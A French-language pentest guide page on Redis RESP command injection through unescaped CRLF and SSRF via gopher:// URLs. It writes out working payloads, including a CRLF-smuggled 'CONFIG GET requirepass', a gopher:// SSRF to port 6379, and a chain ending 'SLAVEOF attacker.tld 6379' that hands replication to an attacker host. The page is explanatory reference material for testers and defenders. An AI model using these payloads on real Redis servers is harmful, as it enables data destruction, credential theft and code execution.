---
order: 2
title: "Injection de commande : faire passer des commandes dans le protocole RESP"
description: "Un CRLF non échappé dans l'entrée utilisateur, ou un SSRF vers un port Redis, permet à un attaquant d'ajouter des commandes RESP supplémentaires et d'atteindre FLUSHALL, CONFIG, SLAVEOF et MODULE LOAD."
keywords:
  - protocole RESP
  - injection CRLF
  - SSRF Redis
  - FLUSHALL
  - SLAVEOF REPLICAOF
  - MODULE LOAD
---

# Injection de commande

Les clients et serveurs Redis communiquent via **RESP** (REdis Serialization Protocol), un protocole orienté texte où chaque élément est terminé par une paire retour-chariot/saut-de-ligne (`\r\n`). Une commande telle que `SET foo bar` est sérialisée sous forme de tableau de bulk strings :

```
*3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n
```

Redis tolère aussi les **commandes inline** : une simple ligne comme `SET foo bar\r\n` est acceptée et analysée sur sa propre ligne. Les deux faits comptent pour l'injection. Comme le protocole délimite les commandes avec `\r\n`, tout CRLF non échappé qui atteint la connexion à l'intérieur de données contrôlées par l'attaquant termine la commande courante et en commence une nouvelle. L'attaquant n'a pas besoin de s'échapper d'une chaîne entre guillemets ; il lui faut un saut de ligne dans le flux d'octets.

## Où le CRLF atteint la connexion

Deux sinks dominent.

D'abord, une **valeur placée dans une commande**. Lorsque le code de l'application construit une ligne de commande à partir de l'entrée utilisateur et l'écrit sur le socket, un saut de ligne dans cette entrée scinde une commande en deux :

```
key = "legit\r\nCONFIG GET requirepass"
```

Si cette valeur est écrite inline sous la forme `SET cache:<key> 1\r\n`, le serveur voit `SET cache:legit`, puis un `CONFIG GET requirepass` séparé. Tout champ qui alimente un nom de clé, une valeur ou un nom de canal sans retirer `\r\n` est un candidat.

Ensuite, le **SSRF vers un port Redis**. Redis écoute couramment sur le TCP 6379 sans authentification à l'intérieur d'un réseau de confiance. Une server-side request forgery qui laisse l'attaquant contrôler des octets bruts, une URL `gopher://`, une URL `dict://` ou un CRLF de protocol-smuggling dans une requête HTTP vers `host:6379`, livre des commandes inline directement au serveur :

```
gopher://127.0.0.1:6379/_%0D%0AINFO%0D%0A
```

`%0D%0A` est le CRLF URL-encodé qui sépare chaque commande smugglée. Un payload `gopher://` multi-lignes peut transporter toute une chaîne d'attaque en une seule requête.

## Commandes dangereuses à atteindre

Une fois que des commandes arbitraires peuvent être envoyées, l'ensemble des cibles est large :

- **`FLUSHALL` / `FLUSHDB`** effacent chaque clé, destructeur et utile pour forcer un comportement de cache-miss.
- **`KEYS *`** énumère chaque clé du store ; `SCAN` fait de même sans bloquer. `GET`, `HGETALL`, `LRANGE` et `MGET` lisent ensuite les valeurs, souvent des tokens de session ou des identifiants mis en cache.
- **`CONFIG GET *`** dumpe la configuration en cours (y compris `requirepass`, `dir`, `dbfilename`) ; **`CONFIG SET`** la réécrit et sous-tend la chaîne RCE d'écriture sur disque (voir [Abus de CONFIG SET](config-set-abuse.md)).
- **`DEBUG`** expose les internes ; `DEBUG SLEEP 10` bloque le serveur et `DEBUG OBJECT` fait fuiter les métadonnées de clé.
- **`SLAVEOF` / `REPLICAOF`** pointent l'instance vers un maître contrôlé par l'attaquant (`SLAVEOF attacker.tld 6379`), qui réplique un jeu de données choisi par l'attaquant et, combiné à la réplication de module, a été une voie vers l'exécution de code.
- **`MODULE LOAD /path/to/module.so`** charge un module natif là où les modules sont activés, exécution de code directe à partir d'un objet partagé déjà présent sur le disque.

## Exemple de chaîne smugglée

Livrée via un SSRF `gopher://`, une séquence reconnaissance-puis-pivot :

```
INFO
CONFIG GET dir
SLAVEOF attacker.tld 6379
```

Chaque ligne est séparée par `\r\n` sur le fil. Les réponses de `INFO` et `CONFIG GET dir` révèlent la version de Redis et le répertoire de travail dont dépend la chaîne [Abus de CONFIG SET](config-set-abuse.md).

## Outils

- **redis-cli** : émettre et vérifier les commandes RESP smugglées contre le serveur.
- **Gopherus** : générer des payloads RESP gopher:// pour l'injection de commande smugglée par SSRF.
- **Burp Repeater** : livrer une entrée porteuse de CRLF ou l'URL SSRF via la requête web.

## Références

- [Redis : RESP protocol specification](https://redis.io/docs/latest/develop/reference/protocol-spec/)
- [Redis : command reference](https://redis.io/docs/latest/commands/)
- [PayloadsAllTheThings : Redis SSRF and command injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
